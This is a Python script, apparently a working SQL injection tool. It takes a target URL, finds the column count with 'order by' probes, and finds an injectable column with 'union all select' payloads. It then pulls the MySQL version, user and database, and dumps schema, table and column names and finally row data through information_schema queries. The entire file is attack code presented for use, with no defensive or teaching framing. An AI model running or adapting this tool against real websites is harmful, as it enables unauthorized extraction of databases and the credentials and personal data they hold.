#!/usr/bin/python

import re,requests

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";
end = "\033[0m";

ver = "version"
username = "user"
db = "database"
patternstart = "<d0rk>"
patternend = "</d0rk>"
sep = ","
ox = "0x"
def __VulnerableColumn__(url):
	columnErrors = {'Unknown Column':'Unknown Column',
				 	'Column': 'Column',
				 	'Order Clause':'order clause'}

	done = False
	count = 1
	columns = 0
	while not done:
		columnurl = url + " order by " + str(count) + "--"
		response = requests.get(columnurl)
		source = response.content
		for type,cMSG in columnErrors.items():
			if re.search(cMSG,source):
				columns = count-1
				print R + "[+]" + end + " Total Columns:  " + str(columns)
				done = True
				count = 1
				columnurl = url
				break
		count+=1

	tempurl = url + " and 1=2 union all select "
	sep = ","

	numstring = "111111"
	tempcol = []
	tempcolstr = []
	injcol = []
	tempcol.append(numstring)

	for x in range(columns):
		if (x == 0):
			pass
		else:
			temp = str(x+1) + str(x+1) + str(x+1)+ str(x+1)+ str(x+1)+ str(x+1)
			tempcol.append(temp)
			numstring = numstring + sep + temp

	unionurl = tempurl + numstring + "--"
	response = requests.get(unionurl)
	source = response.content
	for msg in tempcol:
		if re.search(msg,source):
			coltoint = int(msg)/100000
			injcol.append(coltoint)
			tempcolstr.append(msg)
		else:
			pass
	del tempcol
	print R + "[+]" + end + " Injectable Column: ",
	print ','.join(map(str,injcol))
	print "\nMysql Version : " + __GetInformation__(unionurl,ver,tempcolstr[0])
	print "User : " + __GetInformation__(unionurl,username,tempcolstr[0])
	print "Database : " + __GetInformation__(unionurl,db,tempcolstr[0])
	print "\n" + R + "[+]" + end + " Fetching All Databases...\n"
	__DumpDatabases__(unionurl,tempcolstr[0])
	__DumpTable__(unionurl,tempcolstr[0])
	selectedtable = __DumpColumn__(unionurl,tempcolstr[0])
	__DumpData__(unionurl,tempcolstr[0],selectedtable)
	print

def __GetInformation__(url,info,tempcolstr):
	info = info + "()"
	tempconcaturl = "concat(" + ox + patternstart.encode('hex') + sep + info + sep + ox +patternend.encode('hex') + ")"
	repcol = tempcolstr
	concaturl = url.replace(repcol,tempconcaturl) 
	response = requests.get(concaturl)
	source = response.content
	fetchdata = re.search("<d0rk>(.*?)</d0rk>",source).group(1)
	return fetchdata

def __DumpDatabases__(url,tempcolstr):
	dbnameinject = "(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.schemata)where (0x00) in (@x:=concat(@x,0x3c62723e,schema_name))))x)"
	tempconcaturl = "concat(" + ox + patternstart.encode('hex') + sep + dbnameinject + sep + ox +patternend.encode('hex') + ")"
	repcol = tempcolstr
	concaturl = url.replace(repcol,tempconcaturl) 
	response = requests.get(concaturl)
	source = response.content
	fetchdata = re.search("<d0rk>(.*?)</d0rk>",source).group(1)
	tempdb = re.findall("[^<br>]\w+",fetchdata)
	print '\n'.join(map(str, tempdb))

def __DumpTable__(url,tempcolstr):

	print "\n" + R + "[+]" + end +" Select database:",
	dbchoice = raw_input()
	print R + "[+]" + end +" Fetching Tables...\n"
	tableurltemp = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + ox + dbchoice.encode('hex') + ")"
	tempconcaturl = "concat(" + ox + patternstart.encode('hex') + sep + tableurltemp + sep + ox +patternend.encode('hex') + ")"
	repcol = tempcolstr
	concaturl = url.replace(repcol,tempconcaturl) 
	response = requests.get(concaturl)
	source = response.content
	fetchdata = re.search("<d0rk>(.*?)</d0rk>",source).group(1)
	tempdb = re.findall("[^<br>]\w+",fetchdata)
	print '\n'.join(map(str, tempdb))

def __DumpColumn__(url,tempcolstr):
	print "\n" + R + "[+]" + end +" Select Table:",
	tablechoice = raw_input()
	print R + "[+]" + end +" Fetching Columns...\n"
	columnurltemp = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + ox + tablechoice.encode('hex') + ")"
	tempconcaturl = "concat(" + ox + patternstart.encode('hex') + sep + columnurltemp + sep + ox +patternend.encode('hex') + ")"
	repcol = tempcolstr
	concaturl = url.replace(repcol,tempconcaturl) 
	response = requests.get(concaturl)
	source = response.content
	fetchdata = re.search("<d0rk>(.*?)</d0rk>",source).group(1)
	tempdb = re.findall("[^<br>]\w+",fetchdata)
	print '\n'.join(map(str, tempdb))
	return tablechoice

def __DumpData__(url,tempcolstr,selectedtable):
	print "\n" + R + "[+]" + end +" Select Columns:",
	columnchoice = raw_input()
	print R + "[+]" + end +" Fetching Data...\n"
	editedchoice = columnchoice.replace(",",",0x3a,")
	columnurltemp = "(SELECT+GROUP_CONCAT(" + editedchoice + "+SEPARATOR+0x3c62723e)+FROM+" + selectedtable + ")"
	tempconcaturl = "concat(" + ox + patternstart.encode('hex') + sep + columnurltemp + sep + ox +patternend.encode('hex') + ")"
	repcol = tempcolstr
	concaturl = url.replace(repcol,tempconcaturl) 
	response = requests.get(concaturl)
	source = response.content
	fetchdata = re.search("<d0rk>(.*?)</d0rk>",source).group(1)
	tempdb = fetchdata.replace("<br>","\n")
	# tempdb = re.findall("[^<br>]\w[ :\w?]+",fetchdata)
	# print '\n'.join(map(str, tempdb))
	print tempdb